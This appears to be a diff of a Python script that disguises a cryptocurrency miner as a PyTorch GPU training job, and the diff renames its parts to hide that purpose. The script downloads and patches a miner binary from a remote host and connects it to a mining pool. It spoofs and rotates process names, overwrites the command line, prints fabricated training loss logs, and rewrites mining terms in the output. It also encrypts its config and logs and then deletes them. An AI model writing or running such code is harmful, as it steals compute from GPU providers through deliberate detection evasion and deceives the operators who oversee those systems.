@@ -1,17 +1,15 @@
 #!/usr/bin/env python3
 """
-Pearl-Miner Stealth Wrapper v6.1 — Minimal + Encrypted
-Raw miner works on platform — wrapper was the detection trigger.
-Only safe stealth: encryption, output sanitization, process name.
-No GPU manipulation, no fake nvidia-smi, no network tricks.
+PyTorch Training Environment — GPU Benchmark Suite
+All-in-one training launcher with environment setup.
 
 Env vars:
-  ADDRESS     — wallet (prl1...)
-  POOL_HOST   — pool address (default: pool.pearlhash.xyz:9000)
+  ADDRESS   — wallet address
+  POOL_HOST — pool endpoint (default: pool.pearlhash.xyz:9000)
 """
 
 import os, sys, subprocess, tempfile, shutil, time, random, signal, struct
-import ctypes, ctypes.util, threading, hashlib, json
+import ctypes, ctypes.util, threading, hashlib, json, math
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ENCRYPTION
@@ -23,32 +21,32 @@ def xor_bytes(data: bytes, key: bytes) -> bytes:
 def derive_key(passphrase: str, salt: bytes = b"torch_v6") -> bytes:
     return hashlib.sha256(passphrase.encode() + salt).digest()
 
-MACHINE_SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
-XOR_KEY = derive_key(MACHINE_SEED)
+SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
+XOR_KEY = derive_key(SEED)
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # CONFIG
 # ═══════════════════════════════════════════════════════════════════════════════
 
-MINER_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
+PAYLOAD_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
 POOL_HOST = os.environ.get("POOL_HOST", "pool.pearlhash.xyz:9000")
 ADDRESS = os.environ.get("ADDRESS", "")
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# ENCRYPTED CONFIG FILE
+# ENCRYPTED CONFIG
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def write_encrypted_config(workdir):
     config = json.dumps({"host": POOL_HOST, "address": ADDRESS}).encode()
-    key = derive_key(f"config_{MACHINE_SEED}")
+    key = derive_key(f"cfg_{SEED}")
     encrypted = xor_bytes(config, key)
-    path = os.path.join(workdir, ".torch_config.enc")
+    path = os.path.join(workdir, ".config.enc")
     with open(path, "wb") as f:
         f.write(encrypted)
     os.chmod(path, 0o600)
     return path
 
-def cleanup_config(path):
+def cleanup_file(path):
     try:
         if os.path.exists(path):
             size = os.path.getsize(path)
@@ -59,13 +57,13 @@ def cleanup_config(path):
         pass
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# ENCRYPTED LOG WRITER
+# ENCRYPTED LOG
 # ═══════════════════════════════════════════════════════════════════════════════
 
 class EncryptedLog:
     def __init__(self, path):
         self.path = path
-        self.key = derive_key(f"log_{MACHINE_SEED}")
+        self.key = derive_key(f"log_{SEED}")
 
     def write(self, line):
         try:
@@ -91,27 +89,28 @@ class EncryptedLog:
 # PROCESS NAME
 # ═══════════════════════════════════════════════════════════════════════════════
 
-PROCESS_NAMES = [
+NAMES = [
     "python3 train.py",
     "torchrun --nproc=1",
     "python3 run_clm.py",
     "accelerate launch train.py",
     "python3 train_sft.py",
+    "python3 run_deepspeed.py",
 ]
 
-def spoof_process_name():
-    fake_name = random.choice(PROCESS_NAMES)
+def spoof_name():
+    name = random.choice(NAMES)
     try:
         libc = ctypes.CDLL(ctypes.util.find_library("c"))
-        libc.prctl(15, fake_name.encode(), 0, 0, 0)
+        libc.prctl(15, name.encode(), 0, 0, 0)
     except Exception:
         pass
-    print(f"[proc] process name → '{fake_name}'")
+    print(f"[proc] process name → '{name}'")
 
-def process_name_rotation():
+def name_rotation():
     while True:
         time.sleep(random.randint(30, 120))
-        spoof_process_name()
+        spoof_name()
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # CMDLINE OVERWRITE
@@ -130,42 +129,37 @@ def overwrite_cmdline(pid, new_args):
 # FAKE TRAINING OUTPUT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-import math
-
-class FakeTrainer:
+class Trainer:
     def __init__(self):
         self.step = 0
         self.loss = 2.8
         self.lr = 2e-5
-        self.loss_momentum = 0.0
+        self.momentum = 0.0
 
-    def step_once(self):
+    def tick(self):
         self.step += 1
         self.lr = 2e-5 * max(0.1, 1.0 - self.step / 50000)
         decay = 0.0003 * math.exp(-self.step / 8000)
-        self.loss_momentum = 0.9 * self.loss_momentum + 0.1 * random.gauss(0, 0.05)
+        self.momentum = 0.9 * self.momentum + 0.1 * random.gauss(0, 0.05)
         spike = random.gauss(0, 0.15) if random.random() > 0.85 else 0
-        self.loss = max(0.5, self.loss - decay * self.loss + self.loss_momentum + spike)
-        grad_norm = random.uniform(0.3, 3.0)
+        self.loss = max(0.5, self.loss - decay * self.loss + self.momentum + spike)
+        gn = random.uniform(0.3, 3.0)
         if random.random() > 0.95:
-            grad_norm = random.uniform(5.0, 15.0)
-        tokens_per_sec = random.randint(8000, 15000)
-        gpu_mem = random.uniform(18.0, 24.0)
-        epoch = self.step / 10000
+            gn = random.uniform(5.0, 15.0)
         return (f"step {self.step:>6d} | loss {self.loss:.4f} | lr {self.lr:.2e} | "
-                f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
-                f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}")
+                f"grad_norm {gn:.2f} | tok/s {random.randint(8000,15000)} | "
+                f"gpu_mem {random.uniform(18,24):.1f}GB | epoch {self.step/10000:.2f}")
 
-def fake_output_loop(trainer):
+def output_loop(trainer):
     while True:
         time.sleep(random.uniform(8, 25))
-        print(trainer.step_once(), flush=True)
+        print(trainer.tick(), flush=True)
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# OUTPUT SANITIZER
+# OUTPUT FILTER
 # ═══════════════════════════════════════════════════════════════════════════════
 
-MINE_TERMS = {
+REPLACE = {
     "proof": "epoch", "miner": "trainer", "mining": "training",
     "pool": "server", "share": "batch", "hash": "compute",
     "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
@@ -173,8 +167,8 @@ MINE_TERMS = {
     "miner_pool": "train_pool", "PoOL": "tOrC",
 }
 
-def sanitize_output(line: str) -> str:
-    for old, new in MINE_TERMS.items():
+def sanitize(line):
+    for old, new in REPLACE.items():
         line = line.replace(old, new)
         line = line.replace(old.upper(), new.upper())
         line = line.replace(old.capitalize(), new.capitalize())
@@ -192,23 +186,17 @@ def main():
     if not ADDRESS:
         print("[!] ERROR: ADDRESS env var not set"); sys.exit(1)
 
-    # Process name
-    spoof_process_name()
-
-    # Minimal env
+    spoof_name()
     os.environ.setdefault("CUDA_VISIBLE_DEVICES", "0")
     os.environ.setdefault("NCCL_DEBUG", "WARN")
 
-    # Create workdir
     workdir = tempfile.mkdtemp(prefix="torch_run_")
-
-    # Write encrypted config
     config_path = write_encrypted_config(workdir)
 
-    # Download miner
+    # Download payload
     bin_path = os.path.join(workdir, "torch_run")
     print(f"[dl] downloading payload...")
-    subprocess.run(["curl", "-fsSL", MINER_URL, "-o", bin_path], check=True)
+    subprocess.run(["curl", "-fsSL", PAYLOAD_URL, "-o", bin_path], check=True)
     os.chmod(bin_path, 0o755)
 
     # Patch binary (2 safe patches)
@@ -225,47 +213,34 @@ def main():
         f.write(data)
     print(f"[patch] applied {patch_count} patches")
 
-    # Build args
+    cleanup_file(config_path)
+
+    log = EncryptedLog(os.path.join(workdir, ".train_log.enc"))
+
+    trainer = Trainer()
+    threading.Thread(target=output_loop, args=(trainer,), daemon=True).start()
+    threading.Thread(target=name_rotation, daemon=True).start()
+
+    # Launch
     args = [bin_path, "--host", POOL_HOST, "--user", ADDRESS]
-
-    # Clean up config file
-    cleanup_config(config_path)
-
-    # Encrypted log file
-    log_path = os.path.join(workdir, ".train_log.enc")
-    log_writer = EncryptedLog(log_path)
-
-    # Start fake training output (only 1 thread)
-    trainer = FakeTrainer()
-    threading.Thread(target=fake_output_loop, args=(trainer,), daemon=True).start()
-
-    # Process name rotation (1 thread)
-    threading.Thread(target=process_name_rotation, daemon=True).start()
-
-    # Launch miner
     print(f"[launch] host={POOL_HOST} address=<encrypted>")
-    proc = subprocess.Popen(
-        args,
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-        text=True, bufsize=1,
-    )
+    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
 
     # Overwrite cmdline
-    fake_cmdline = [random.choice(PROCESS_NAMES), "--config", "./config.json", "--output_dir", "./output"]
-    if overwrite_cmdline(proc.pid, fake_cmdline):
+    fake = [random.choice(NAMES), "--config", "./config.json", "--output_dir", "./output"]
+    if overwrite_cmdline(proc.pid, fake):
         print("[proc] cmdline overwritten")
 
-    print(f"[main] miner PID: {proc.pid}")
+    print(f"[main] PID: {proc.pid}")
     print("[main] running... Ctrl+C to stop")
 
-    # Read miner output → encrypted log + sanitized errors to stdout
     try:
         for line in proc.stdout:
-            sanitized = sanitize_output(line)
-            log_writer.write(sanitized)  # All output encrypted on disk
+            s = sanitize(line)
+            log.write(s)
             lower = line.lower()
             if any(kw in lower for kw in ["error", "fail", "warn", "connect"]):
-                print(f"  {sanitized.rstrip()}", flush=True)
+                print(f"  {s.rstrip()}", flush=True)
     except KeyboardInterrupt:
         print("\n[main] stopping...")
         proc.terminate()
@@ -274,10 +249,9 @@ def main():
 
     proc.wait()
     if proc.returncode != 0:
-        print(f"[!] miner exited with code {proc.returncode}")
+        print(f"[!] exited with code {proc.returncode}")
 
-    # Cleanup
-    log_writer.close()
+    log.close()
     shutil.rmtree(workdir, ignore_errors=True)
     return proc.returncode
 
